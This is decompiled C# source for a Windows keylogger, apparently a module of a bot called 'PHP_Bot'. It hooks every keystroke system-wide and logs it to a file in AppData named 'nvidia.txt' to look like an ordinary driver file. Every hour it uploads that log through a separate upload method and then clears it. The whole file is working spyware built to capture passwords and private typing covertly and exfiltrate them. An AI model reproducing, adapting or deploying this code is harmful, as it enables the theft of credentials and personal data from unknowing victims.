using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

namespace PHP_Bot;

internal class LogMe
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.txt");

	public static byte caps = 0;

	public static byte shift = 0;

	public static byte failed = 0;

	private static string window = "";

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	public static void k()
	{
		_hookID = SetHook(_proc);
		Timer timer = new Timer();
		timer.Elapsed += OnTimedEvent;
		timer.AutoReset = true;
		timer.Interval = 3600000.0;
		timer.Start();
		GC.KeepAlive(timer);
	}

	[DllImport("user32.dll")]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(int hWnd, StringBuilder text, int count);

	public static string GetActiveWindow()
	{
		int num = 0;
		StringBuilder stringBuilder = new StringBuilder(256);
		num = GetForegroundWindow();
		if (GetWindowText(num, stringBuilder, 256) > 0)
		{
			return stringBuilder.ToString();
		}
		return "could not find title.";
	}

	public static void OnTimedEvent(object sender, EventArgs e)
	{
		Methods.UploadFile(path);
		try
		{
			File.Delete(path);
			File.Create(path);
		}
		catch
		{
			try
			{
				File.Delete(path);
				File.Create(path);
			}
			catch
			{
				try
				{
					File.Delete(path);
					File.Create(path);
				}
				catch
				{
					try
					{
						File.Delete(path);
						File.Create(path);
					}
					catch
					{
					}
				}
			}
		}
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Invalid comparison between I4 and Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Invalid comparison between Unknown and I4
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Invalid comparison between Unknown and I4
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected I4, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Invalid comparison between Unknown and I4
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Invalid comparison between Unknown and I4
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Invalid comparison between Unknown and I4
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected I4, but got Unknown
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected I4, but got Unknown
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_030a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0328: Expected I4, but got Unknown
		//IL_0328: Unknown result type (might be due to invalid IL or missing references)
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0351: Expected I4, but got Unknown
		//IL_0351: Unknown result type (might be due to invalid IL or missing references)
		//IL_0358: Unknown result type (might be due to invalid IL or missing references)
		//IL_036e: Expected I4, but got Unknown
		try
		{
			StreamWriter streamWriter;
			int num;
			if (nCode >= 0 && wParam == (IntPtr)256)
			{
				streamWriter = File.AppendText(path);
				num = Marshal.ReadInt32(lParam);
				if (65536 == (int)Control.get_ModifierKeys())
				{
					shift = 1;
				}
				Keys val = (Keys)num;
				if ((int)val <= 32)
				{
					if ((int)val <= 13)
					{
						switch (val - 8)
						{
						case 0:
							goto IL_0087;
						case 1:
							goto IL_0097;
						}
						if ((int)val != 13)
						{
							goto IL_036e;
						}
						streamWriter.WriteLine("");
					}
					else if ((int)val != 20)
					{
						if ((int)val != 32)
						{
							goto IL_036e;
						}
						streamWriter.Write(" ");
					}
					else if (caps == 0)
					{
						caps = 1;
					}
					else
					{
						caps = 0;
					}
					goto IL_05f4;
				}
				if ((int)val <= 93)
				{
					switch (val - 48)
					{
					case 0:
						goto IL_0141;
					case 1:
						goto IL_016e;
					case 2:
						goto IL_019b;
					case 3:
						goto IL_01c8;
					case 4:
						goto IL_01f5;
					case 5:
						goto IL_0222;
					case 6:
						goto IL_024f;
					case 7:
						goto IL_027c;
					case 8:
						goto IL_02a9;
					case 9:
						goto IL_02d6;
					}
					switch (val - 91)
					{
					case 0:
					case 1:
					case 2:
						goto IL_05e9;
					}
				}
				else
				{
					switch (val - 160)
					{
					case 0:
					case 1:
					case 2:
					case 3:
					case 4:
					case 5:
						goto IL_05e9;
					}
					switch (val - 186)
					{
					case 0:
						goto IL_04c0;
					case 1:
						goto IL_04ed;
					case 2:
						goto IL_051a;
					case 3:
						goto IL_0547;
					case 4:
						goto IL_0574;
					case 5:
						goto IL_059b;
					case 6:
						goto IL_05c2;
					}
					switch (val - 219)
					{
					case 0:
						goto IL_042c;
					case 1:
						goto IL_0459;
					case 2:
						goto IL_0469;
					case 3:
						goto IL_0496;
					}
				}
				goto IL_036e;
			}
			goto end_IL_0001;
			IL_016e:
			if (shift == 0)
			{
				streamWriter.Write("1");
			}
			else
			{
				streamWriter.Write("!");
			}
			goto IL_05f4;
			IL_024f:
			if (shift == 0)
			{
				streamWriter.Write("6");
			}
			else
			{
				streamWriter.Write("^");
			}
			goto IL_05f4;
			IL_051a:
			if (shift == 0)
			{
				streamWriter.Write(",");
			}
			else
			{
				streamWriter.Write("<");
			}
			goto IL_05f4;
			IL_05e9:
			streamWriter.Write("");
			goto IL_05f4;
			IL_0222:
			if (shift == 0)
			{
				streamWriter.Write("5");
			}
			else
			{
				streamWriter.Write("%");
			}
			goto IL_05f4;
			IL_05f4:
			shift = 0;
			streamWriter.Close();
			goto end_IL_0001;
			IL_0097:
			streamWriter.Write("TAB");
			goto IL_05f4;
			IL_0087:
			streamWriter.Write("back");
			goto IL_05f4;
			IL_0459:
			streamWriter.Write("|");
			goto IL_05f4;
			IL_059b:
			if (shift == 0)
			{
				streamWriter.Write("/");
			}
			else
			{
				streamWriter.Write("?");
			}
			goto IL_05f4;
			IL_01f5:
			if (shift == 0)
			{
				streamWriter.Write("4");
			}
			else
			{
				streamWriter.Write("$");
			}
			goto IL_05f4;
			IL_01c8:
			if (shift == 0)
			{
				streamWriter.Write("3");
			}
			else
			{
				streamWriter.Write("#");
			}
			goto IL_05f4;
			IL_042c:
			if (shift == 0)
			{
				streamWriter.Write("[");
			}
			else
			{
				streamWriter.Write("{");
			}
			goto IL_05f4;
			IL_0496:
			if (shift == 0)
			{
				streamWriter.Write("'");
			}
			else
			{
				streamWriter.Write('"');
			}
			goto IL_05f4;
			IL_019b:
			if (shift == 0)
			{
				streamWriter.Write("2");
			}
			else
			{
				streamWriter.Write("@");
			}
			goto IL_05f4;
			IL_0574:
			if (shift == 0)
			{
				streamWriter.Write(".");
			}
			else
			{
				streamWriter.Write(">");
			}
			goto IL_05f4;
			IL_05c2:
			if (shift == 0)
			{
				streamWriter.Write("`");
			}
			else
			{
				streamWriter.Write("~");
			}
			goto IL_05f4;
			IL_04ed:
			if (shift == 0)
			{
				streamWriter.Write("=");
			}
			else
			{
				streamWriter.Write("+");
			}
			goto IL_05f4;
			IL_02d6:
			if (shift == 0)
			{
				streamWriter.Write("9");
			}
			else
			{
				streamWriter.Write("(");
			}
			goto IL_05f4;
			IL_0547:
			if (shift == 0)
			{
				streamWriter.Write("-");
			}
			else
			{
				streamWriter.Write("_");
			}
			goto IL_05f4;
			IL_0141:
			if (shift == 0)
			{
				streamWriter.Write("0");
			}
			else
			{
				streamWriter.Write(")");
			}
			goto IL_05f4;
			IL_02a9:
			if (shift == 0)
			{
				streamWriter.Write("8");
			}
			else
			{
				streamWriter.Write("*");
			}
			goto IL_05f4;
			IL_04c0:
			if (shift == 0)
			{
				streamWriter.Write(";");
			}
			else
			{
				streamWriter.Write(":");
			}
			goto IL_05f4;
			IL_036e:
			if (shift == 0 && caps == 0)
			{
				streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
			}
			if (shift == 1 && caps == 0)
			{
				streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
			}
			if (shift == 0 && caps == 1)
			{
				streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
			}
			if (shift == 1 && caps == 1)
			{
				streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
			}
			goto IL_05f4;
			IL_027c:
			if (shift == 0)
			{
				streamWriter.Write("7");
			}
			else
			{
				streamWriter.Write("&");
			}
			goto IL_05f4;
			IL_0469:
			if (shift == 0)
			{
				streamWriter.Write("]");
			}
			else
			{
				streamWriter.Write("}");
			}
			goto IL_05f4;
			end_IL_0001:;
		}
		catch
		{
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}
}
